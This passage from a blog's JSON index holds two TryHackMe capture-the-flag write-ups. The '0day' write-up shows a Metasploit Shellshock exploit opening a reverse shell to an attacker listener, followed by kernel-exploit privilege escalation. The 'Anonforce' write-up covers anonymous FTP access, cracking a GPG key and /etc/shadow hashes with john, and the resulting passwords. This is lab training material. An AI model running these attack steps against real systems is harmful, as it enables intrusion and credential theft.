to listen on a ll addresses. SRVPORT 8080 yes The local port to listen on. Payload options (linux/x86/shell/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.8.95.227 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 10.8.95.227:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (36 bytes) to 10.10.152.56 [*] Command shell session 1 opened (10.8.95.227:4444 -\u0026gt; 10.10.152.56:48442) at 2023-06-12 16:32:43 +0530 id uid=33(www-data) gid=33(www-data) groups=33(www-data) whoami www-data 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 shell [*] Trying to find binary \u0026#39;python\u0026#39; on the target machine [*] Found python at /usr/bin/python [*] Using `python` to pop up an interactive shell [*] Trying to find binary \u0026#39;bash\u0026#39; on the target machine [*] Found bash at /bin/bash www-data@ubuntu:/usr/lib/cgi-bin$ ls ls test.cgi www-data@ubuntu:/usr/lib/cgi-bin$ cd /home cd /home www-data@ubuntu:/home$ ls ls ryan www-data@ubuntu:/home$ cd ryan cd ryan www-data@ubuntu:/home/ryan$ ls ls user.txt www-data@ubuntu:/home/ryan$ cat user.txt cat user.txt THM{Sh3llSh0ck_r0ckz} root flag After executing linpeas, we got the exploit exploit.\ncompile exploit using gcc.\ngcc ofs.c -o ofs\nUpload to server using python -m http.server\nRun binary to get root!!\n1 2 3 4 5 6 7 8 9 10 11 12 www-data@ubuntu:/tmp$ ./ofs ./ofs spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library whoami root cat /root/root.txt THM{g00d_j0b_0day_isPleased} ","description":"Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":26,"section":"posts","tags":["TryHackMe","Shellshock","HashCracking"],"title":"TryHackMe Writeup - 0day Room","uri":"https://g4nd1v.github.io/posts/tryhackme-0day/"},{"content":"Title Title https://tryhackme.com/room/bsidesgtanonforce Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 └─$ nmap -sC -sV -oA nmap/anonforce 10.10.57.47 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 20:07 EST Nmap scan report for 10.10.57.47 Host is up (0.100s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Feb 21 17:04 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib | drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 | drwx------ 2 0 0 16384 Aug 11 2019 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 2019 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt | dr-xr-xr-x 103 0 0 0 Feb 21 17:04 proc | drwx------ 3 0 0 4096 Aug 11 2019 root | drwxr-xr-x 18 0 0 540 Feb 21 17:04 run | drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv | dr-xr-xr-x 13 0 0 0 Feb 21 17:04 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.95.227 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds Here we can see that FTP is open.\nLogin with ftp with anonymous username and empty password.\nUser Flag In /home/melodias there is a user.txt file. We have to download the file using get command.\nUsing get user.txt it will download user.txt file in current directory.\nuser.txt → 606083fd33beb1284fc51f411a706af8\nRoot Flag After surfing through different directories, I found a specific one notread and when you change your directory in notread, you will see 2 files i.e. backup.pgp and private.asc. Now, download both of the files using get command.\nFrom this article https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html we can get to know how to crack GPG private key using john.\nFirstly, convert it into hash.\n└─$ gpg2john private.asc \u0026gt; hash.hash\nThen using john we can crack the hash.\n1 2 3 4 5 6 7 8 9 10 11 12 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2024-02-21 20:21) 4.761g/s 4428p/s 4428c/s 4428C/s lawrence..sheena Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. The plaintext is xbox360.\nNow, import private.asc in gpg and then decrypt it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 └─$ gpg --import private.asc gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created gpg: key B92CD1F280AD82C2: public key \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; imported gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: Total number processed: 2 gpg: imported: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 └─$ gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7::: Copy this shadow file in shadow.txt and the using john we can decrypt the password for root.\n1 2 3 4 5 6 7 8 9 10 11 12 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt Warning: only loading hashes of type \u0026#34;sha512crypt\u0026#34;, but also saw type \u0026#34;md5crypt\u0026#34; Use the \u0026#34;--format=md5crypt\u0026#34; option to force loading hashes of that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hikari (root) 1g 0:00:00:13 DONE (2024-02-21 20:35) 0.07293g/s 490.1p/s 490.1c/s 490.1C/s oblivion..BITCH Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Root password is hikari.\nUsing ssh we can login with root and then get the root flag using cat /root/root.txt\nFlag: f706456440c7af4187810c31c6cebdce\n","description":"boot2root machine for FIT and bsides guatemala CTF","id":27,"section":"posts","tags":["TryHackMe","FTP","John-The-Ripper"],"title":"TryHackMe Writeup - Anonforce Room","uri":"https://g4nd1v.github.io/posts/tryhackme-anonforce/"}]